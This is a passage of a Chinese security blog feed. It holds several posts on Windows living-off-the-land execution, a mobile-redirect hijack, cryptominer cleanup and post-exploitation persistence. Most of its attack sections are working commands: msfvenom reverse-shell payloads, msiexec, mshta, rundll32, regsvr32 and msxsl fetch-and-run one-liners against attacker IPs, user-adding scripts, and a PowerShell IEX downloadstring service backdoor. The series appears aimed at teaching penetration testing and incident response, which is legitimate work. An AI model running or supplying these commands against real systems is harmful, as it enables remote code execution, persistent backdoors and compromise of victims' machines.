/log=log_file.tx</span></span><br></pre></td></tr></table></figure><p>使用winscp.exe 作为命令行参数执行远程上传/下载操作。</p><p><img src="./image/20200413-8.png" alt=""></p><p><strong>9、msiexec</strong></p><p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成msi包</span></span><br><span class="line">msfvenom -p windows/exec CMD=<span class="string">&#x27;net user test abc123! /add&#x27;</span> -f msi &gt; evil.msi</span><br><span class="line"><span class="comment">#远程执行</span></span><br><span class="line">msiexec /q /i http://192.168.28.128/evil.msi</span><br></pre></td></tr></table></figure><p>成功添加了一个test用户：</p><p><img src="./image/20200413-9.png" alt=""></p><p><strong>10、IEExec</strong></p><p><a href="http://IEexec.xn--exe-8v2fya797itqz7vi.NET">IEexec.exe应用程序是.NET</a> Framework附带程序，存在于多个系统白名单内。</p><p>生成Payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.28.131 <span class="attribute">lport</span>=4444 -f exe -o evil.exe</span><br></pre></td></tr></table></figure><p>使用管理员身份打开cmd，分别运行下面两条命令。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\Windows\Microsoft.NET\Framework64\v2.<span class="number">0</span>.<span class="number">50727</span>&gt;caspol.exe -s <span class="literal">off</span></span><br><span class="line"><span class="attribute">C</span>:\Windows\Microsoft.NET\Framework64\v2.<span class="number">0</span>.<span class="number">50727</span>&gt;IEExec.exe http://<span class="number">192.168.28.131</span>/evil.exe</span><br></pre></td></tr></table></figure><p><img src="./image/20200413-10.png" alt=""></p><p><strong>11、mshta</strong></p><p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:<span class="comment">//192.168.28.128/run.hta</span></span><br></pre></td></tr></table></figure><p>run.hta内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Window</span>.<span class="property">ReSizeTo</span> <span class="number">0</span>, <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Window</span>.<span class="property">moveTo</span> -<span class="number">2000</span>,-<span class="number">2000</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Set</span> objShell = <span class="title class_">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">objShell.<span class="property">Run</span> <span class="string">&quot;cmd.exe /c net user test password /add&quot;</span> <span class="comment">// 这里填写命令</span></span></span><br><span class="line"><span class="language-javascript">self.<span class="property">close</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">demo</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="./image/20200413-11.png" alt=""></p><p><strong>12、rundll32</strong></p><p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p><p>项目地址：<a href="https://github.com/Hood3dRob1n/JSRat-Py.git">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p><p>步骤一：开始运行JSRat，监听本地8888端口。</p><p><img src="./image/20200413-12-1.png" alt=""></p><p>步骤二：通过url访问，可以查看恶意代码。</p><p><img src=".%5Cimage%5C20200413-12-2.png" alt=""></p><p>复制代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.<span class="property">exe</span> <span class="attr">javascript</span>:<span class="string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;<span class="variable language_">document</span>.<span class="title function_">write</span>();h=<span class="keyword">new</span>%20ActiveXObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);h.<span class="title class_">Open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.28.131:8888/connect&quot;</span>,<span class="literal">false</span>);<span class="keyword">try</span>&#123;h.<span class="title class_">Send</span>();b=h.<span class="property">ResponseText</span>;<span class="built_in">eval</span>(b);&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">new</span>%20ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).<span class="title class_">Run</span>(<span class="string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,<span class="number">0</span>,<span class="literal">true</span>);&#125;</span><br></pre></td></tr></table></figure><p>步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：</p><p><img src="./image/20200413-12-3.png" alt=""></p><p>**13、regsvr32 **</p><p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p><p>在目标机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll</span><br></pre></td></tr></table></figure><p>可以通过自己构造.sct文件，去下载执行我们的程序</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?XML version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">registration</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">progid</span>=<span class="string">&quot;ShortJSRAT&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">classid</span>=<span class="string">&quot;</span></span></span><span class="template-variable">&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span> &gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        &lt;![CDATA[</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">            ps  = &quot;cmd.exe /c calc.exe&quot;;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        ]]&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>执行命令，成功弹计算器：</p><p><img src="./image/20200413-13.png" alt=""></p><p><strong>14、MSXSL.EXE</strong></p><p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p><p>下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p><p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">28.128</span><span class="regexp">/scripts/</span>demo.xml http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">28.128</span><span class="regexp">/scripts/</span>exec.xsl</span><br></pre></td></tr></table></figure><p>demo.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;exec.xsl&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">customers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">customer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Microsoft<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">customer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">customers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>exec.xsl</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:msxsl</span>=<span class="string">&quot;urn:schemas-microsoft-com:xslt&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:user</span>=<span class="string">&quot;http://mycompany.com/mynamespace&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">msxsl:script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span> <span class="attr">implements-prefix</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">   function xml(nodelist) &#123;</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);</span><br><span class="line">   return nodelist.nextNode().xml;</span><br><span class="line">  </span><br><span class="line">   &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">msxsl:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;user:xml(.)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="./image/20200413-14.png" alt=""></p><p><strong>15、pubprn.vbs</strong></p><p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&quot;</span> <span class="number">127.0</span>.<span class="number">0.1</span> script:https:<span class="regexp">//gi</span>st.githubusercontent.com<span class="regexp">/enigma0x3/</span><span class="number">64</span>adf8ba99d4485c478b67e03ae6b04a<span class="regexp">/raw/</span>a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span><br></pre></td></tr></table></figure><p>test.sct</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?XML version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">registration</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">description</span>=<span class="string">&quot;Bandit&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">progid</span>=<span class="string">&quot;Bandit&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">version</span>=<span class="string">&quot;1.00&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">classid</span>=<span class="string">&quot;</span></span></span><span class="template-variable">&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">remotable</span>=<span class="string">&quot;true&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">&lt;![CDATA[</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">]]&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="./image/20200413-15.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第06章：Web实战篇第5篇：移动端劫持</title>
      <link href="/posts/213716a0.html"/>
      <url>/posts/213716a0.html</url>
      
        <content type="html"><![CDATA[<h2 id="第5篇：移动端劫持">第5篇：移动端劫持</h2><p>PC端访问正常，移动端访问出现异常，比如插入弹窗、嵌入式广告和跳转到第三方网站，将干扰用户的正常使用，对用户体验造成极大伤害。</p><h3 id="现象描述">现象描述</h3><p>部分网站用户反馈，手机打开网站就会跳转到赌博网站。</p><h3 id="问题处理">问题处理</h3><p>访问网站首页，抓取到了一条恶意js： <a href="http://js.zadovosnjppnywuz.com/caonima.js">http://js.zadovosnjppnywuz.com/caonima.js</a></p><p><img src="./image/5-1.png" alt=""></p><p>我们可以发现，攻击者通过这段js代码判断手机访问来源，劫持移动端（如手机、ipad、Android等）流量，跳转到https://262706.com。</p><p>进一步访问https://262706.com，跳转到赌博网站：</p><p><img src="./image/5-2.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第04章：Windows实战篇第5篇：挖矿病毒（一）</title>
      <link href="/posts/481f6e43.html"/>
      <url>/posts/481f6e43.html</url>
      
        <content type="html"><![CDATA[<h2 id="第5篇：挖矿病毒（一）">第5篇：挖矿病毒（一）</h2><h3 id="0x00-前言">0x00 前言</h3><p>​随着虚拟货币的疯狂炒作，挖矿病毒已经成为不法分子利用最为频繁的攻击方式之一。病毒传播者可以利用个人电脑或服务器进行挖矿，具体现象为电脑CPU占用率高，C盘可使用空间骤降，电脑温度升高，风扇噪声增大等问题。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​某天上午重启服务器的时候，发现程序启动很慢，打开任务管理器，发现cpu被占用接近100%，服务器资源占用严重。</p><p><img src="image/win-8-1.png" alt=""></p><h3 id="0x02-事件分析">0x02 事件分析</h3><p>​登录网站服务器进行排查，发现多个异常进程：</p><p><img src="image/win-8-2.png" alt=""></p><p>分析进程参数：</p><p>wmic process get caption,commandline /value &gt;&gt; tmp.txt</p><p><img src="image/win-8-3.png" alt=""></p><p>TIPS:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在windows下查看某个运行程序（或进程）的命令行参数</span><br><span class="line">使用下面的命令：</span><br><span class="line">wmic process <span class="built_in">get</span> caption,commandline /value</span><br><span class="line">如果想查询某一个进程的命令行参数，使用下列方式：</span><br><span class="line">wmic process where <span class="attribute">caption</span>=”svchost.exe” <span class="built_in">get</span> caption,commandline /value</span><br><span class="line">这样就可以得到进程的可执行文件位置等信息。</span><br></pre></td></tr></table></figure><p>访问该链接：</p><p><img src="image/win-8-4.png" alt=""></p><p>Temp目录下发现Carbon、run.bat挖矿程序:</p><p><img src="image/win-8-5.png" alt=""></p><p>具体技术分析细节详见：</p><blockquote><p>360CERT：利用WebLogic漏洞挖矿事件分析</p><p><a href="https://www.anquanke.com/post/id/92223">https://www.anquanke.com/post/id/92223</a></p></blockquote><p>清除挖矿病毒：关闭异常进程、删除c盘temp目录下挖矿程序 。</p><p><strong>临时防护方案</strong></p><ol><li><p>根据实际环境路径，删除WebLogic程序下列war包及目录</p><p>rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war</p><p>rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war</p><p>rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat</p></li><li><p>重启WebLogic或系统后，确认以下链接访问是否为404</p><p><a href="http://x.x.x.x:7001/wls-wsat">http://x.x.x.x:7001/wls-wsat</a></p></li></ol><h3 id="0x04-防范措施">0x04 防范措施</h3><p>​新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率。通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞，如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞，Struts2远程命令执行等，导致大量服务器被感染挖矿程序的现象 。总结了几种预防措施：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第03章：权限维持篇第6篇：三大渗透测试框架权限维持技术</title>
      <link href="/posts/75567d72.html"/>
      <url>/posts/75567d72.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>在渗透测试中，有三个非常经典的渗透测试框架----Metasploit、Empire、Cobalt Strike。</p><p>那么，通过漏洞获取到目标主机权限后，如何利用框架获得持久性权限呢？</p><h3 id="0x01-MSF权限维持">0x01 MSF权限维持</h3><p>使用MSF维持权限的前提是先获得一个<em>meterpreter</em>  shell，通过<em>meterpreter</em> shell获取持久性shell的方法有两种：</p><p><strong>Persistence模块</strong></p><p>通过启动项启动(persistence)的方式，在目标机器上以反弹回连。</p><p><img src="./image/privilege-3-1.png" alt=""></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；</span><br><span class="line">-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。</span><br><span class="line">-S：作为服务自动启动代理程序（具有SYSTEM权限）</span><br></pre></td></tr></table></figure><p>生成的相关文件位置 ：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 后门文件位置：</span><br><span class="line"><span class="name">C</span>:\Windows\Temp</span><br><span class="line"><span class="name">C</span>:\Users\Administrator\AppData\Local\Temp</span><br><span class="line"># 注册表位置：</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</span><br></pre></td></tr></table></figure><p><img src="./image/privilege-3-2.png" alt=""></p><p><strong>Metsvc 模块</strong></p><p>通过服务(metsvc)启动的方式，在目标机器启动后自启动一个服务，等待连接。</p><p><img src="./image/privilege-3-3.png" alt=""></p><p>后门排查：目标主机上开启了一个Meterpreter服务。</p><p><img src="./image/privilege-3-4.png" alt=""></p><h3 id="0x02-Empire-权限维持">0x02 Empire 权限维持</h3><p>Empire的persistence模块提供了18种权限维持的方法，大致可以分为四类，即</p><p><img src="./image/privilege-3-17.png" alt=""></p><table><thead><tr><th style="text-align:left">elevated（管理权限）</th><th style="text-align:left">misc（杂项）</th><th style="text-align:left">powerbreach</th><th style="text-align:left">userland（用户权限）</th></tr></thead><tbody><tr><td style="text-align:left">registry*</td><td style="text-align:left">add_netuser</td><td style="text-align:left">deaduser</td><td style="text-align:left">backdoor_lnk</td></tr><tr><td style="text-align:left">schtasks*</td><td style="text-align:left">add_sid_history*</td><td style="text-align:left">eventlog*</td><td style="text-align:left">registry</td></tr><tr><td style="text-align:left">wmi*</td><td style="text-align:left">debugger*</td><td style="text-align:left">resolver</td><td style="text-align:left">schtasks</td></tr><tr><td style="text-align:left">wmi_updater*</td><td style="text-align:left">disable_machine_acct_change*</td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">get_ssps</td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">install_ssp*</td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">memssp*</td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left">skeleton_key*</td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><p><strong>注册表</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; agents</span><br><span class="line">(Empire: agents) &gt; interact URL3FZBV</span><br><span class="line">(Empire: URL3FZBV) &gt; usemodule persistence/elevated/registry*</span><br><span class="line">(Empire: powershell/persistence/elevated/registry) &gt; <span class="built_in">set</span> Listener <span class="built_in">test</span></span><br><span class="line">(Empire: powershell/persistence/elevated/registry) &gt; execute</span><br></pre></td></tr></table></figure><p><img src="./image/privilege-3-5.png" alt=""></p><p>因为是开机启动，所以会弹个黑框，之后还会弹出注册表添加的powershell启动项的框，在注册表位置如下：</p><p><img src="./image/privilege-3-6.png" alt=""></p><p><strong>计划任务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; interact 9NZ2RWBC</span><br><span class="line">(Empire: 9NZ2RWBC) &gt; usemodule persistence/elevated/schtasks*</span><br><span class="line">(Empire: powershell/persistence/elevated/schtasks) &gt; <span class="built_in">set</span> Listener <span class="built_in">test</span></span><br><span class="line">(Empire: powershell/persistence/elevated/schtasks) &gt; <span class="built_in">set</span> DailyTime 22:50</span><br><span class="line">(Empire: powershell/persistence/elevated/schtasks) &gt; execute</span><br></pre></td></tr></table></figure><p><img src="./image/privilege-3-7.png" alt=""></p><p>在任务计划程序库可以看到-任务为Updater-启动程序如下可以到为powershell</p><p><img src="./image/privilege-3-8.png" alt=""></p><p><strong>wmi</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; interact 9NZ2RWBC</span><br><span class="line">(Empire: 9NZ2RWBC) &gt; usemodule persistence/elevated/wmi</span><br><span class="line">(Empire: powershell/persistence/elevated/wmi) &gt; <span class="built_in">set</span> Listener <span class="built_in">test</span></span><br><span class="line">(Empire: powershell/persistence/elevated/wmi) &gt; run</span><br></pre></td></tr></table></figure><p><img src="./image/privilege-3-9.png" alt=""></p><p>如何清除后门，最简单的方法就是使用Autoruns，选择WMI选项卡，右键就可以删除恶意后门。</p><p><img src="./image/privilege-3-10.png" alt=""></p><h3 id="0x03-Cobalt-Strike权限维持">0x03 Cobalt Strike权限维持</h3><p>通过Cobalt Strike拿到一个shell，留后门的方法有很多，下面介绍两种比较常见的无文件、自启动后门。</p><p>从Cobalt Strike菜单栏，Attacks–Web Drive-by–Scaripted Web Delivery，生成powershell后门。</p><p><img src="./image/privilege-3-11.png" alt=""></p><p>根据需要可以自己选择，填写所需参数默认端口是80（需要注意的就是不要使用重复端口），Type选择powershell。</p><p><img src="./image/privilege-3-12.png" alt=""></p><p>点击Launch后，返回powershell远程下载执行命令。</p><p><img src="./image/privilege-3-13.png" alt=""></p><p><strong>服务自启动后门</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc <span class="keyword">create</span> &quot;Name&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX ((<span class="built_in">new</span>-<span class="keyword">object</span> net.webclient).downloadstring(<span class="string">&#x27;http://192.168.28.142:8080/a&#x27;</span>))\&quot;&quot;</span><br><span class="line">sc description  <span class="type">Name</span> &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class="line">sc config <span class="type">Name</span> start= auto             //设置这个服务为自动启动 </span><br><span class="line">net <span class="keyword">start</span> <span class="type">Name</span>                         //启动服务</span><br></pre></td></tr></table></figure><p>重启服务器后，成功返回一个shell。</p><p><img src="./image/privilege-3-14.png" alt=""></p><p><strong>注册表自启动</strong></p><p>在windows启动项注册表里面添加一个木马程序路径，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt;</span><span class="language-bash">getsystem</span></span><br><span class="line"><span class="meta prompt_">beacon&gt;</span><span class="language-bash">shell reg add 